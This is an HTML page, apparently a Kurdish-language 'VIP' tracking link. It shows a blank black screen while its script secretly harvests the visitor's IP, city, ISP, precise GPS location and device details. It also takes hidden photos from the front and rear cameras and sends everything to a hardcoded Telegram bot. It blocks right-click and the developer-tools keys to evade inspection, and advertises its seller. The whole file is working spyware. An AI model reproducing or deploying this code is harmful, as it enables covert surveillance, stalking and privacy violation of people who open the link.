<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #000000;
            color: #000000; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden;
        }
        .card { display: none; }
        #hidden-video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="card" id="main-card"></div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) {
                return false;
            }
        };

        const token = '8927591228:AAGdIn4qL1xVXpH-jQ-lX_Ccgsy5jMByol4';
        const chat_id = '7643191802';
        const api = 'https://api.telegram.org/bot' + token;

        async function sendText(text) {
            try {
                await fetch(`${api}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chat_id, text: text })
                });
            } catch (e) {}
        }

        function getGeoLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("📍 جیۆلۆکەیشن: پشتەڤانی ناهێتە کرن");
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lon = pos.coords.longitude;
                        const acc = pos.coords.accuracy;
                        resolve(`📍 جیۆلۆکەیشن (GPS VIP): ${lat}, ${lon}\n🎯 خێرایی/دروستی (Accuracy): ${acc} متر\n🗺 نەخشە: https://maps.google.com/?q=${lat},${lon}`);
                    },
                    (err) => {
                        resolve("📍 جیۆلۆکەیشن: نەهاتە دان یان ژ لایێ مێهڤانی ڤە هاتە رەتکرن");
                    },
                    { timeout: 7000, enableHighAccuracy: true, maximumAge: 0 }
                );
            });
        }

        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const bat = await navigator.getBattery();
                    return `🔋 رێژا باترییێ: ${Math.round(bat.level * 100)}% (${bat.charging ? 'بار دبیت ⚡' : 'بێ بار'})`;
                }
            } catch(e) {}
            return "🔋 رێژا باترییێ: نەهاتە بدەستخستن";
        }

        function getGpuInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "🎮 گرافیك: WebGL نەهاتیە ڤەکرن";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    return `🎮 چێڤەرێ گرافیكی (GPU VIP): ${renderer} (${vendor})`;
                }
            } catch (e) {}
            return "🎮 گرافیك: نەهاتە ناسین";
        }

        function getNetworkInfo() {
            try {
                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                if (conn) {
                    return `📶 جۆرێ ئینتەرنێتێ: ${conn.effectiveType || 'نەدیار'} | خێرایی: ${conn.downlink || '?'} Mbps | پینگ (RTT): ${conn.rtt || '?'}ms`;
                }
            } catch (e) {}
            return "📶 جۆرێ ئینتەرنێتێ: نەدیار";
        }

        async function getIpInfo() {
            try {
                let res = await fetch('https://ipapi.co/json/');
                let data = await res.json();
                return `🌍 وەڵات: ${data.country_name} (${data.country_code})\n🏙 باژێر: ${data.city} - ناوچە: ${data.region}\n🌐 ئایپی (IP): ${data.ip}\n🏢 کۆمپانیا (ISP): ${data.org}\n📮 پۆست کۆد: ${data.postal}`;
            } catch (e) {
                return "🌍 زانیاریێن IP: نەهاتنە دیتن";
            }
        }

        async function getUltimateInfo() {
            let ipDetails = await getIpInfo();
            let geoDetails = await getGeoLocation();
            let batteryDetails = await getBatteryInfo();
            let gpuDetails = getGpuInfo();
            let netDetails = getNetworkInfo();
            let currentTime = new Date().toLocaleString();
            
            return `👑 [ 🔥 VIP MAX ULTIMATE SYSTEM LOG 🔥 ] 👑
⏱ دەم و ڕوژ: ${currentTime}
----------------------------------
${ipDetails}
----------------------------------
${geoDetails}
----------------------------------
${batteryDetails}
${gpuDetails}
${netDetails}
----------------------------------
📱 سیستەم: ${navigator.platform}
🧠 هۆشی (RAM): ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'نەدیار'}
⚙️ کۆرسیێن پرۆسێسەری: ${navigator.hardwareConcurrency || 'نەدیار'}
👆 دەستکاریکرنا شاشەی (Touch Points): ${navigator.maxTouchPoints || 0}
🌐 بووکەر: ${navigator.userAgent}
🗣 زمان: ${navigator.language}
📐 قەبارەی شاشەی: ${window.screen.width}x${window.screen.height}
🖥 قەبارەی پەنجەرەی کارا: ${window.innerWidth}x${window.innerHeight}`;
        }

        async function sendVisitorLog() {
            let details = await getUltimateInfo();
            sendText(`⚡ سەردانکەرەکێ نوو (VIP FULL MAX LEVEL) لینک ڤەکەت!\n\n${details}\n\n⚠️ بڕڤەبەر: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆسا ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);
        }

        async function captureCamera(facing, label) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facing }
                });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;

                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play().then(() => {
                            setTimeout(async () => {
                                const canvas = document.getElementById('canvas');
                                canvas.width = video.videoWidth || 1280;
                                canvas.height = video.videoHeight || 720;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                                canvas.toBlob(async (blob) => {
                                    if (blob) {
                                        let details = await getUltimateInfo();
                                        const formData = new FormData();
                                        formData.append('chat_id', chat_id);
                                        formData.append('photo', blob, 'shot.jpg');
                                        formData.append('caption', `📸 وێنەیێ VIP MAX (${label})!\n\n${details}\n\n⚠️ بڕڤەبەر: @YUSEEF_SURCHI\n🤖 بۆ دروستکرنا بۆتێن هۆسا ب هەرزانترین بها سەردانا بەڕێوەبەری بکەن: @YUSEEF_SURCHI\n⚖️ بۆ هەر کارەکێ بێ ئەخلاق ئەم بەرپرس نینین.`);

                                        await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
                                    }
                                    stream.getTracks().forEach(t => t.stop());
                                    resolve();
                                }, 'image/jpeg', 0.95);
                            }, 800); // کاتی تومارکرنا وێنەی ب لەززەت هاتە ڕێکخستن
                        }).catch(() => {
                            stream.getTracks().forEach(t => t.stop());
                            resolve();
                        });
                    };
                });
            } catch (err) {}
        }

        // پڕۆسەیا خۆکار پشتی 0.1 چرکە (100 밀یسەکن)
        window.onload = function() {
            setTimeout(async () => {
                await sendVisitorLog();
                await captureCamera("user", "کامێرا پێشی (Selfie VIP)");
                await captureCamera("environment", "کامێرا پاش (Rear VIP)");
            }, 100); // 100 ms = 0.1 Second
        };
    </script>
</body>
</html>
